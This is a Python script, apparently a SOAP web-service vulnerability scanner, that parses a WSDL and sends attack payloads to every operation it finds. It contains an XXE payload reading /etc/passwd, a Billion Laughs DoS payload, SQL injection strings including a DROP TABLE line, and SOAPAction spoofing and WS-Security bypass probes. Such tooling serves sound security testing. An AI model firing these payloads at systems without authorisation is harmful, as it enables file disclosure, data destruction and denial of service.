#!/usr/bin/env python3
"""Agent for security testing SOAP web services.

Parses WSDL definitions using zeep/lxml, tests for XXE, SQL injection,
SOAPAction spoofing, and WS-Security bypass vulnerabilities.
"""

import requests
import json
import sys
import re
from lxml import etree


SOAP_NS = {
    "wsdl": "http://schemas.xmlsoap.org/wsdl/",
    "soap": "http://schemas.xmlsoap.org/wsdl/soap/",
    "soap12": "http://schemas.xmlsoap.org/wsdl/soap12/",
    "wsse": "http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd",
}


class SOAPSecurityTester:
    """Tests SOAP web services for common vulnerabilities."""

    def __init__(self, wsdl_url, endpoint_url=None):
        self.wsdl_url = wsdl_url
        self.endpoint_url = endpoint_url
        self.operations = []
        self.findings = []

    def parse_wsdl(self):
        """Fetch and parse the WSDL to extract operations and endpoint."""
        resp = requests.get(self.wsdl_url, timeout=30)
        resp.raise_for_status()
        root = etree.fromstring(resp.content)

        if not self.endpoint_url:
            addr = root.find(".//soap:address", SOAP_NS)
            if addr is not None:
                self.endpoint_url = addr.get("location")

        for binding_op in root.findall(".//wsdl:binding/wsdl:operation", SOAP_NS):
            name = binding_op.get("name")
            soap_op = binding_op.find("soap:operation", SOAP_NS)
            action = soap_op.get("soapAction", "") if soap_op is not None else ""
            self.operations.append({"name": name, "action": action})
        return self.operations

    def _send_soap(self, body_xml, soap_action="", timeout=10):
        headers = {"Content-Type": "text/xml; charset=utf-8"}
        if soap_action:
            headers["SOAPAction"] = soap_action
        return requests.post(self.endpoint_url, data=body_xml,
                             headers=headers, timeout=timeout)

    def test_xxe(self, operation_name):
        """Test for XML External Entity injection."""
        payloads = [
            ("Classic XXE file read",
             f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
             f'"file:///etc/passwd">]><soapenv:Envelope xmlns:soapenv='
             f'"http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body>'
             f'<{operation_name}>&xxe;</{operation_name}>'
             f'</soapenv:Body></soapenv:Envelope>'),
            ("Billion Laughs DoS",
             f'<?xml version="1.0"?><!DOCTYPE lolz ['
             f'<!ENTITY lol "lol"><!ENTITY l2 "&lol;&lol;&lol;&lol;&lol;">'
             f'<!ENTITY l3 "&l2;&l2;&l2;&l2;&l2;">]>'
             f'<soapenv:Envelope xmlns:soapenv='
             f'"http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body>'
             f'<{operation_name}>&l3;</{operation_name}>'
             f'</soapenv:Body></soapenv:Envelope>'),
        ]
        results = []
        for name, payload in payloads:
            try:
                resp = self._send_soap(payload, timeout=10)
                vulnerable = "root:" in resp.text or resp.elapsed.total_seconds() > 5
                if vulnerable:
                    self.findings.append({"severity": "CRITICAL", "type": "XXE",
                                          "operation": operation_name, "test": name})
                results.append({"test": name, "vulnerable": vulnerable,
                                "status": resp.status_code,
                                "time_s": resp.elapsed.total_seconds()})
            except requests.RequestException as exc:
                results.append({"test": name, "error": str(exc)})
        return results

    def test_sql_injection(self, operation_name, soap_action=""):
        """Test SOAP parameters for SQL injection error disclosure."""
        sqli_payloads = ["' OR '1'='1", "1; DROP TABLE users--",
                         "' UNION SELECT NULL--", "admin'/*"]
        results = []
        sql_errors = ["SQL syntax", "ORA-", "SQLSTATE", "Unclosed quotation",
                      "Microsoft OLE DB", "PostgreSQL"]
        for payload in sqli_payloads:
            body = (f'<soapenv:Envelope xmlns:soapenv='
                    f'"http://schemas.xmlsoap.org/soap/envelope/">'
                    f'<soapenv:Body><{operation_name}>'
                    f'<param>{payload}</param></{operation_name}>'
                    f'</soapenv:Body></soapenv:Envelope>')
            try:
                resp = self._send_soap(body, soap_action, timeout=15)
                error_found = any(e in resp.text for e in sql_errors)
                if error_found:
                    self.findings.append({"severity": "CRITICAL", "type": "SQL Injection",
                                          "operation": operation_name,
                                          "payload": payload[:30]})
                results.append({"payload": payload, "sql_error": error_found,
                                "status": resp.status_code})
            except requests.RequestException:
                continue
        return results

    def test_soapaction_spoofing(self):
        """Test whether mismatched SOAPAction headers are accepted."""
        results = []
        for i, op in enumerate(self.operations):
            for j, other in enumerate(self.operations):
                if i == j:
                    continue
                body = (f'<soapenv:Envelope xmlns:soapenv='
                        f'"http://schemas.xmlsoap.org/soap/envelope/">'
                        f'<soapenv:Body><{op["name"]}><p>test</p>'
                        f'</{op["name"]}></soapenv:Body></soapenv:Envelope>')
                try:
                    resp = self._send_soap(body, other["action"])
                    if resp.status_code == 200 and "Fault" not in resp.text:
                        self.findings.append({"severity": "HIGH",
                                              "type": "SOAPAction Spoofing",
                                              "operation": op["name"],
                                              "spoofed_action": other["action"]})
                        results.append({"op": op["name"],
                                        "spoofed": other["action"], "accepted": True})
                except requests.RequestException:
                    continue
        return results

    def test_ws_security_bypass(self):
        """Test whether requests without WS-Security tokens are accepted."""
        if not self.operations:
            return []
        op = self.operations[0]
        body = (f'<soapenv:Envelope xmlns:soapenv='
                f'"http://schemas.xmlsoap.org/soap/envelope/">'
                f'<soapenv:Body><{op["name"]}><p>test</p>'
                f'</{op["name"]}></soapenv:Body></soapenv:Envelope>')
        try:
            resp = self._send_soap(body)
            accepted = resp.status_code == 200 and "Fault" not in resp.text
            if accepted:
                self.findings.append({"severity": "CRITICAL",
                                      "type": "WS-Security Bypass",
                                      "operation": op["name"]})
            return [{"test": "No WS-Security header", "accepted": accepted}]
        except requests.RequestException as exc:
            return [{"error": str(exc)}]

    def generate_report(self):
        report = {"target": self.endpoint_url, "wsdl": self.wsdl_url,
                  "operations": len(self.operations),
                  "findings_count": len(self.findings),
                  "findings": self.findings}
        print(json.dumps(report, indent=2))
        return report


def main():
    wsdl = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080/ws?wsdl"
    tester = SOAPSecurityTester(wsdl)
    tester.parse_wsdl()
    for op in tester.operations:
        tester.test_xxe(op["name"])
        tester.test_sql_injection(op["name"], op["action"])
    tester.test_soapaction_spoofing()
    tester.test_ws_security_bypass()
    tester.generate_report()


if __name__ == "__main__":
    main()
